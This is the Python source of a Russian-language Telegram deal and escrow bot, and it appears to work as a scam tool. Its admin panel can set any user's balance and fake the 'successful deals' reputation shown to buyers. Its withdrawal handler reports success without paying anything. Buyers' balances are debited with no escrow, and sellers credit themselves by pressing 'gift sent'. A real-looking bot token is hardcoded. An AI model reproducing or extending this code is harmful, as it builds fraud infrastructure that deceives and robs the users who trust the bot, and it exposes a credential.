import sqlite3
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes
import uuid
import logging
import os
import asyncio
from messages import get_text  # Импортируем функцию для получения текста
import requests  # Для автопинга
import threading  # Для автопинга
import time  # Для автопинга
import sys  # Добавлено для диагностики

# Настройка логгера с поддержкой Windows
class WindowsConsoleHandler(logging.StreamHandler):
    """Обработчик логов, который заменяет эмодзи на текст для Windows"""
    def emit(self, record):
        try:
            msg = self.format(record)
            # Заменяем эмодзи на текстовые аналоги для Windows
            if sys.platform == 'win32':
                msg = msg.replace('✅', '[OK]')
                msg = msg.replace('🔄', '[PING]')
                msg = msg.replace('❌', '[ERROR]')
                msg = msg.replace('🔴', '[RED]')
                msg = msg.replace('🟢', '[GREEN]')
                msg = msg.replace('💰', '[MONEY]')
                msg = msg.replace('💼', '[BAG]')
                msg = msg.replace('📄', '[DOC]')
                msg = msg.replace('🔗', '[LINK]')
                msg = msg.replace('📝', '[NOTE]')
                msg = msg.replace('⚠️', '[WARN]')
                msg = msg.replace('🔹', '>')
            stream = self.stream
            stream.write(msg + self.terminator)
            self.flush()
        except Exception:
            self.handleError(record)

# Настройка логгера
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

# Создаем обработчик для файла (всегда работает)
file_handler = logging.FileHandler('bot.log', encoding='utf-8')
file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(file_handler)

# Создаем обработчик для консоли с поддержкой Windows
console_handler = WindowsConsoleHandler()
console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(console_handler)

# Конфигурация бота
BOT_TOKEN = "8633462057:AAHcxtADXeta8kUNvXWYnuZhtGWKARUgURw"  # Замените на ваш токен
ADMIN_ID = 6812643332  # ID администратора
VALUTE = "RUB"  # По умолчанию валюта - RUB

# Флаг для предотвращения множественного запуска
BOT_RUNNING = False

# Хранение данных
user_data = {}  # Данные пользователей: {user_id: {'wallet': 'адрес', 'balance': float, 'successful_deals': int, 'lang': 'ru'}}
deals = {}  # Сделки: {deal_id: {'amount': float, 'description': str, 'seller_id': int, 'buyer_id': int}}
admin_commands = {}  # Команды админа: {user_id: 'command'}

# Подключение к базе данных
DB_NAME = 'bot_data.db'

def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()

    # Создаем таблицу users, если её нет
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            wallet TEXT,
            balance REAL,
            successful_deals INTEGER,
            lang TEXT
        )
    ''')

    # Проверяем, существует ли столбец lang
    cursor.execute("PRAGMA table_info(users)")
    columns = cursor.fetchall()
    column_names = [column[1] for column in columns]  # Получаем список имен столбцов

    if 'lang' not in column_names:
        # Добавляем столбец lang, если его нет
        cursor.execute('ALTER TABLE users ADD COLUMN lang TEXT DEFAULT "ru"')

    # Создаем таблицу deals, если её нет
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS deals (
            deal_id TEXT PRIMARY KEY,
            amount REAL,
            description TEXT,
            seller_id INTEGER,
            buyer_id INTEGER
        )
    ''')

    conn.commit()
    conn.close()

def load_data():
    global user_data, deals
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    
    # Загрузка данных о пользователях
    cursor.execute('SELECT * FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id, wallet, balance, successful_deals, lang = row
        user_data[user_id] = {
            'wallet': wallet,
            'balance': balance,
            'successful_deals': successful_deals,
            'lang': lang or 'ru'  # По умолчанию язык - русский
        }
    
    # Загрузка данных о сделках
    cursor.execute('SELECT * FROM deals')
    rows = cursor.fetchall()
    for row in rows:
        deal_id, amount, description, seller_id, buyer_id = row
        deals[deal_id] = {
            'amount': amount,
            'description': description,
            'seller_id': seller_id,
            'buyer_id': buyer_id
        }
    
    conn.close()

def save_user_data(user_id):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    user = user_data.get(user_id, {})
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, wallet, balance, successful_deals, lang)
        VALUES (?, ?, ?, ?, ?)
    ''', (user_id, user.get('wallet', ''), user.get('balance', 0.0), user.get('successful_deals', 0), user.get('lang', 'ru')))
    conn.commit()
    conn.close()

def save_deal(deal_id):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    deal = deals.get(deal_id, {})
    cursor.execute('''
        INSERT OR REPLACE INTO deals (deal_id, amount, description, seller_id, buyer_id)
        VALUES (?, ?, ?, ?, ?)
    ''', (deal_id, deal.get('amount', 0.0), deal.get('description', ''), deal.get('seller_id', None), deal.get('buyer_id', None)))
    conn.commit()
    conn.close()

def delete_deal(deal_id):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM deals WHERE deal_id = ?', (deal_id,))
    conn.commit()
    conn.close()

# Функция для проверки и создания записи пользователя, если её нет
def ensure_user_exists(user_id):
    if user_id not in user_data:
        user_data[user_id] = {'wallet': '', 'balance': 0.0, 'successful_deals': 0, 'lang': 'ru'}
        save_user_data(user_id)

async def set_bot_username(application):
    """Получение имени пользователя бота при запуске"""
    try:
        bot_user = await application.bot.get_me()
        application.bot_data['username'] = bot_user.username
        logger.info(f"Бот запущен: @{bot_user.username}")
    except Exception as e:
        logger.error(f"Ошибка при получении имени бота: {e}")
        application.bot_data['username'] = "GltfEIfbot"  # Запасной вариант

def get_bot_username(context):
    """Получение имени бота из контекста"""
    return context.application.bot_data.get('username', "GltfEIfbot")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        # Получаем user_id в зависимости от типа обновления
        if update.message:  # Если это сообщение
            user_id = update.message.from_user.id
            chat_id = update.message.chat_id
            args = context.args  # Получаем аргументы команды /start
        elif update.callback_query:  # Если это callback-запрос
            user_id = update.callback_query.from_user.id
            chat_id = update.callback_query.message.chat_id
            args = []
        else:
            return

        ensure_user_exists(user_id)  # Убедимся, что пользователь существует
        lang = user_data.get(user_id, {}).get('lang', 'ru')  # Получаем язык пользователя

        # Если передан deal_id и сделка существует
        if args and args[0] in deals:
            deal_id = args[0]
            deal = deals[deal_id]
            seller_id = deal['seller_id']
            
            # Получаем username продавца
            try:
                seller_chat = await context.bot.get_chat(seller_id)
                seller_username = seller_chat.username or f"ID: {seller_id}"
            except:
                seller_username = f"ID: {seller_id}"
            
            # Добавляем покупателя в сделку
            deals[deal_id]['buyer_id'] = user_id
            save_deal(deal_id)  # Сохраняем сделку в базу данных

            # Уведомление покупателю
            await context.bot.send_message(
                chat_id,
                get_text(lang, "deal_info_message", 
                         deal_id=deal_id, 
                         seller_username=seller_username, 
                         successful_deals=user_data.get(seller_id, {}).get('successful_deals', 0), 
                         description=deal['description'], 
                         wallet=user_data.get(seller_id, {}).get('wallet', 'Не указан'), 
                         amount=deal['amount'], 
                         valute=VALUTE),
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton(get_text(lang, "pay_from_balance_button"), callback_data=f'pay_from_balance_{deal_id}')],
                    [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]
                ])
            )

            # Уведомление продавцу
            try:
                buyer_chat = await context.bot.get_chat(user_id)
                buyer_username = buyer_chat.username or f"ID: {user_id}"
            except:
                buyer_username = f"ID: {user_id}"
                
            await context.bot.send_message(
                seller_id,
                get_text(lang, "seller_notification_message", 
                         buyer_username=buyer_username, 
                         deal_id=deal_id, 
                         successful_deals=user_data.get(seller_id, {}).get('successful_deals', 0))
            )
            
            return  # Завершаем выполнение функции, чтобы не показывать главное меню 
            
        if user_id == ADMIN_ID:
            # Админ-панель
            keyboard = [
                [InlineKeyboardButton(get_text(lang, "admin_view_deals_button"), callback_data='admin_view_deals')],
                [InlineKeyboardButton(get_text(lang, "admin_change_balance_button"), callback_data='admin_change_balance')],
                [InlineKeyboardButton(get_text(lang, "admin_change_successful_deals_button"), callback_data='admin_change_successful_deals')],
                [InlineKeyboardButton(get_text(lang, "admin_change_valute_button"), callback_data='admin_change_valute')],
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await context.bot.send_message(chat_id, get_text(lang, "admin_panel_message"), reply_markup=reply_markup)
        else:
            # Обычное меню для пользователей
            keyboard = [
                [InlineKeyboardButton(get_text(lang, "add_wallet_button"), callback_data='wallet')],
                [InlineKeyboardButton(get_text(lang, "create_deal_button"), callback_data='create_deal')],
                [InlineKeyboardButton(get_text(lang, "referral_button"), callback_data='referral')],
                [InlineKeyboardButton(get_text(lang, "withdraw_button"), callback_data='withdraw')],  # Добавлена кнопка вывода
                [InlineKeyboardButton(get_text(lang, "change_lang_button"), callback_data='change_lang')],
                [InlineKeyboardButton(get_text(lang, "support_button"), url='https://t.me/ElfiSupport')],
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            # Проверяем, есть ли photo_url в сообщении
            try:
                await context.bot.send_photo(
                    chat_id,
                    photo="https://postimg.cc/8sHq27HV",
                    caption=get_text(lang, "start_message"),
                    reply_markup=reply_markup
                )
            except:
                # Если не удалось отправить фото, отправляем только текст
                await context.bot.send_message(
                    chat_id,
                    get_text(lang, "start_message"),
                    reply_markup=reply_markup
                )
    except Exception as e:
        logger.error(f"Ошибка в функции start: {e}")
        await context.bot.send_message(chat_id, "Произошла ошибка. Пожалуйста, попробуйте позже.")

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        data = query.data
        user_id = query.from_user.id
        chat_id = query.message.chat_id
        
        ensure_user_exists(user_id)  # Убедимся, что пользователь существует
        lang = user_data.get(user_id, {}).get('lang', 'ru')
        bot_username = get_bot_username(context)

        # Обработка выбора языка
        if data.startswith('lang_'):
            new_lang = data.split('_')[-1]
            user_data[user_id]['lang'] = new_lang
            save_user_data(user_id)  # Сохраняем изменения в базе данных
            
            # Пытаемся отредактировать сообщение, если это возможно
            try:
                await query.edit_message_text(get_text(new_lang, "lang_set_message"))
            except:
                await context.bot.send_message(chat_id, get_text(new_lang, "lang_set_message"))
            
            # После смены языка показываем меню
            fake_update = type('obj', (object,), {
                'message': None,
                'callback_query': update.callback_query,
                'effective_user': update.effective_user,
                'effective_chat': update.effective_chat
            })
            await start(fake_update, context)
            return

        # Обработка вывода средств
        elif data == 'withdraw':
            balance = user_data.get(user_id, {}).get('balance', 0)
            
            if balance < 3000:
                status_message = get_text(lang, "withdraw_minimum_error", balance=balance, valute=VALUTE)
                await context.bot.send_message(
                    chat_id,
                    get_text(lang, "withdraw_message", balance=balance, valute=VALUTE, status_message=status_message),
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
                )
            else:
                status_message = get_text(lang, "withdraw_available")
                await context.bot.send_message(
                    chat_id,
                    get_text(lang, "withdraw_message", balance=balance, valute=VALUTE, status_message=status_message),
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton(get_text(lang, "simulate_withdraw_button"), callback_data='simulate_withdraw')],
                        [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]
                    ])
                )

        elif data == 'simulate_withdraw':
            balance = user_data.get(user_id, {}).get('balance', 0)
            if balance >= 3000:
                # В демо-режиме не списываем средства, только показываем сообщение
                await context.bot.send_message(
                    chat_id,
                    get_text(lang, "withdraw_success", amount=balance, valute=VALUTE),
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
                )
                
                # Уведомление админу о запросе на вывод
                await context.bot.send_message(
                    ADMIN_ID,
                    f"💰 Запрос на вывод средств\n\n"
                    f"Пользователь: {user_id}\n"
                    f"Сумма: {balance} {VALUTE}\n"
                    f"Кошелек: {user_data.get(user_id, {}).get('wallet', 'Не указан')}"
                )
            else:
                await context.bot.send_message(
                    chat_id,
                    get_text(lang, "withdraw_minimum_error", balance=balance, valute=VALUTE),
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
                )

        # Остальные условия обработки кнопок
        elif data == 'wallet':
            wallet = user_data.get(user_id, {}).get('wallet', None)
            if wallet:
                await context.bot.send_message(
                    chat_id,
                    get_text(lang, "wallet_message", wallet=wallet),
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
                )
            else:
                await context.bot.send_message(
                    chat_id,
                    get_text(lang, "wallet_message", wallet="Не указан"),
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
                )
            context.user_data['awaiting_wallet'] = True  # Устанавливаем флаг ожидания кошелька

        elif data == 'create_deal':
            try:
                await context.bot.send_photo(
                    chat_id,
                    photo="https://postimg.cc/8sHq27HV",
                    caption=get_text(lang, "create_deal_message", valute=VALUTE),
                    parse_mode="MarkdownV2",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
                )
            except:
                await context.bot.send_message(
                    chat_id,
                    get_text(lang, "create_deal_message", valute=VALUTE),
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
                )
            context.user_data['awaiting_amount'] = True  # Устанавливаем флаг ожидания суммы

        elif data == 'referral':
            referral_link = f"https://t.me/{bot_username}?start={user_id}"
            await context.bot.send_message(
                chat_id,
                get_text(lang, "referral_message", referral_link=referral_link, valute=VALUTE),
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
            )

        elif data == 'change_lang':
            await context.bot.send_message(
                chat_id,
                get_text(lang, "change_lang_message"),
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton(get_text(lang, "english_lang_button"), callback_data='lang_en')],
                    [InlineKeyboardButton(get_text(lang, "russian_lang_button"), callback_data='lang_ru')]
                ])
            )

        elif data == 'menu':
            # Возврат в главное меню
            fake_update = type('obj', (object,), {
                'message': None,
                'callback_query': update.callback_query,
                'effective_user': update.effective_user,
                'effective_chat': update.effective_chat
            })
            await start(fake_update, context)

        # Админ-панель
        elif data == 'admin_view_deals':
            if user_id == ADMIN_ID:
                if not deals:
                    await context.bot.send_message(chat_id, "Нет активных сделок.")
                else:
                    deals_list = "\n".join([f"Сделка {deal_id}: {deal['amount']} {VALUTE}, Продавец: {deal['seller_id']}" for deal_id, deal in deals.items()])
                    await context.bot.send_message(chat_id, get_text(lang, "admin_view_deals_message", deals_list=deals_list))

        elif data == 'admin_change_balance':
            if user_id == ADMIN_ID:
                await query.edit_message_text(get_text(lang, "admin_change_balance_message"))
                admin_commands[user_id] = 'change_balance'

        elif data == 'admin_change_successful_deals':
            if user_id == ADMIN_ID:
                await query.edit_message_text(get_text(lang, "admin_change_successful_deals_message"))
                admin_commands[user_id] = 'change_successful_deals'

        elif data == 'admin_change_valute':
            if user_id == ADMIN_ID:
                await query.edit_message_text(get_text(lang, "admin_change_valute_message"))
                admin_commands[user_id] = 'change_valute'

        # Обработка подтверждения отправки подарка
        elif data.startswith('gift_sent_'):
            deal_id = data.replace('gift_sent_', '')
            deal = deals.get(deal_id)
            if deal and deal['seller_id'] == user_id:
                amount = deal['amount']
                
                # Зачисляем средства на баланс продавца
                user_data[user_id]['balance'] += amount
                save_user_data(user_id)
                
                # Уведомление продавцу
                await context.bot.send_message(
                    chat_id,
                    get_text(lang, "gift_sent_confirmation_message", 
                            deal_id=deal_id, 
                            amount=amount, 
                            valute=VALUTE),
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
                )
                
                # Уведомление покупателю
                if deal['buyer_id']:
                    buyer_lang = user_data.get(deal['buyer_id'], {}).get('lang', 'ru')
                    await context.bot.send_message(
                        deal['buyer_id'],
                        get_text(buyer_lang, "gift_sent_buyer_notification", deal_id=deal_id),
                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(buyer_lang, "menu_button"), callback_data='menu')]])
                    )
                
                # Удаляем сделку
                del deals[deal_id]
                delete_deal(deal_id)

        # Обработка оплаты с баланса
        elif data.startswith('pay_from_balance_'):
            deal_id = data.replace('pay_from_balance_', '')
            deal = deals.get(deal_id)
            if deal:
                buyer_id = user_id
                seller_id = deal['seller_id']
                amount = deal['amount']

                # Проверяем и создаем записи, если их нет
                ensure_user_exists(buyer_id)
                ensure_user_exists(seller_id)

                if user_data[buyer_id]['balance'] >= amount:
                    # Списание средств у покупателя
                    user_data[buyer_id]['balance'] -= amount
                    save_user_data(buyer_id)

                    # Зачисление средств продавцу (временно, пока не подтвердит отправку)
                    # В реальном боте лучше создать escrow-счет
                    
                    # Уведомление покупателю
                    await context.bot.send_message(
                        chat_id,
                        get_text(lang, "payment_confirmed_message", 
                                deal_id=deal_id, 
                                amount=amount, 
                                valute=VALUTE, 
                                description=deal['description']),
                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
                    )

                    # Получаем username покупателя
                    try:
                        buyer_chat = await context.bot.get_chat(buyer_id)
                        buyer_username = buyer_chat.username or f"ID: {buyer_id}"
                    except:
                        buyer_username = f"ID: {buyer_id}"

                    # Уведомление продавцу с кнопкой подтверждения отправки
                    seller_lang = user_data.get(seller_id, {}).get('lang', 'ru')
                    await context.bot.send_message(
                        seller_id,
                        get_text(seller_lang, "payment_confirmed_seller_message", 
                                deal_id=deal_id, 
                                description=deal['description'], 
                                buyer_username=buyer_username),
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton(get_text(seller_lang, "gift_sent_button"), callback_data=f'gift_sent_{deal_id}')],
                            [InlineKeyboardButton(get_text(seller_lang, "menu_button"), callback_data='menu')]
                        ])
                    )
                else:
                    await context.bot.send_message(
                        chat_id,
                        get_text(lang, "insufficient_balance_message"),
                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
                    )

    except Exception as e:
        logger.error(f"Ошибка в функции button: {e}")
        await context.bot.send_message(chat_id, "Произошла ошибка. Пожалуйста, попробуйте позже.")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        global VALUTE  
        user_id = update.message.from_user.id
        text = update.message.text
        chat_id = update.message.chat_id
        
        ensure_user_exists(user_id)  # Убедимся, что пользователь существует
        lang = user_data.get(user_id, {}).get('lang', 'ru')
        bot_username = get_bot_username(context)

        if user_id == ADMIN_ID and admin_commands.get(user_id) == 'change_balance':
            try:
                target_user_id, new_balance = map(str.strip, text.split())
                target_user_id = int(target_user_id)
                new_balance = float(new_balance)
                ensure_user_exists(target_user_id)
                user_data[target_user_id]['balance'] = new_balance
                save_user_data(target_user_id)  # Сохраняем изменения в базе данных
                await update.message.reply_text(f"Баланс пользователя {target_user_id} изменен на {new_balance} {VALUTE}.")
            except ValueError:
                await update.message.reply_text("Неверный формат. Введите ID пользователя и баланс через пробел.")
            admin_commands[user_id] = None

        elif user_id == ADMIN_ID and admin_commands.get(user_id) == 'change_successful_deals':
            try:
                target_user_id, new_successful_deals = map(str.strip, text.split())
                target_user_id = int(target_user_id)
                new_successful_deals = int(new_successful_deals)
                ensure_user_exists(target_user_id)
                user_data[target_user_id]['successful_deals'] = new_successful_deals
                save_user_data(target_user_id)  # Сохраняем изменения в базе данных
                await update.message.reply_text(f"Количество успешных сделок пользователя {target_user_id} изменено на {new_successful_deals}.")
            except ValueError:
                await update.message.reply_text("Неверный формат. Введите ID пользователя и количество успешных сделок через пробел.")
            admin_commands[user_id] = None

        elif user_id == ADMIN_ID and admin_commands.get(user_id) == 'change_valute':
            VALUTE = text.strip().upper()  
            await update.message.reply_text(f"Валюта изменена на {VALUTE}.")
            admin_commands[user_id] = None

        elif context.user_data.get('awaiting_amount', False):
            try:
                amount = float(text)
                if amount <= 0:
                    await update.message.reply_text("Сумма должна быть положительным числом.")
                    return
                    
                context.user_data['amount'] = amount
                context.user_data['awaiting_amount'] = False
                context.user_data['awaiting_description'] = True
                await update.message.reply_text(
                    get_text(lang, "awaiting_description_message"),
                    parse_mode="MarkdownV2",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
                )
            except ValueError:
                await update.message.reply_text("Неверный формат. Введите число.")

        elif context.user_data.get('awaiting_description', False):
            if not text.strip():
                await update.message.reply_text("Описание не может быть пустым.")
                return
                
            deal_id = str(uuid.uuid4())
            deals[deal_id] = {
                'amount': context.user_data['amount'],
                'description': text,
                'seller_id': user_id,
                'buyer_id': None
            }
            save_deal(deal_id)  # Сохраняем сделку в базу данных
            context.user_data.clear()
           
            # Используем автоматически определенное имя бота
            deal_link = f"https://t.me/{bot_username}?start={deal_id}"
            
            await update.message.reply_text(
                get_text(lang, "deal_created_message", 
                        amount=deals[deal_id]['amount'], 
                        valute=VALUTE, 
                        description=deals[deal_id]['description'], 
                        deal_link=deal_link),
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
            )
            # Уведомление админу
            await context.bot.send_message(
                ADMIN_ID,
                f"Новая сделка создана:\n"
                f"ID: {deal_id}\n"
                f"Сумма: {deals[deal_id]['amount']} {VALUTE}\n"
                f"Продавец: {deals[deal_id]['seller_id']}\n"
                f"Ссылка: {deal_link}"
            )

        elif context.user_data.get('awaiting_wallet', False):
            if not text.strip():
                await update.message.reply_text("Адрес кошелька не может быть пустым.")
                return
                
            try:
                user_data[user_id]['wallet'] = text  # Обновляем кошелек
                save_user_data(user_id)  # Сохраняем изменения в базе данных
                context.user_data.pop('awaiting_wallet', None)  # Очищаем флаг ожидания
                await update.message.reply_text(
                    get_text(lang, "wallet_updated_message", wallet=text),
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
                )
            except Exception as e:
                logger.error(f"Ошибка при обновлении кошелька: {e}")
                await update.message.reply_text("Произошла ошибка при обновлении кошелька.")

    except Exception as e:
        logger.error(f"Ошибка в функции handle_message: {e}")
        await update.message.reply_text("Произошла ошибка. Пожалуйста, попробуйте позже.")

# Функция для поддержания бота активным на Render
def keep_alive():
    """Пинг сам себя каждые 10 минут, чтобы Render не отключал"""
    
    # 🔥 ВАЖНО: ЗАМЕНИТЕ на URL вашего бота на Render!
    # Пример: https://otc-elf.onrender.com
    RENDER_URL = "https://otc-lm75.onrender.com"  # ← ИЗМЕНИТЕ ЭТО!
    
    def ping():
        while True:
            try:
                # Отправляем GET-запрос к самому себе
                response = requests.get(RENDER_URL, timeout=10)
                # Используем текст без эмодзи для Windows
                logger.info(f"Auto-ping: status {response.status_code}")
            except Exception as e:
                logger.error(f"Auto-ping error: {e}")
            
            # Спим 10 минут (600 секунд)
            time.sleep(600)
    
    # Запускаем пинг в отдельном потоке
    thread = threading.Thread(target=ping, daemon=True)
    thread.start()
    logger.info("Keep-alive system started")

# Запуск бота
def main() -> None:
    global BOT_RUNNING
    
    # Проверяем, не запущен ли уже бот
    if BOT_RUNNING:
        logger.error("Бот уже запущен! Завершаем работу.")
        return
    
    BOT_RUNNING = True
    keep_alive()  # Запускаем систему автопинга
    
    try:
        init_db()  # Инициализация базы данных
        load_data()  # Загрузка данных из базы данных

        application = Application.builder().token(BOT_TOKEN).build()

        # Регистрация обработчиков
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CallbackQueryHandler(button))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

        # Получаем имя бота при запуске
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(set_bot_username(application))

        # Запуск бота
        logger.info("Бот запущен и готов к работе!")
        application.run_polling(allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        logger.error(f"Ошибка при запуске бота: {e}")
    finally:
        BOT_RUNNING = False

if __name__ == "__main__":
    main()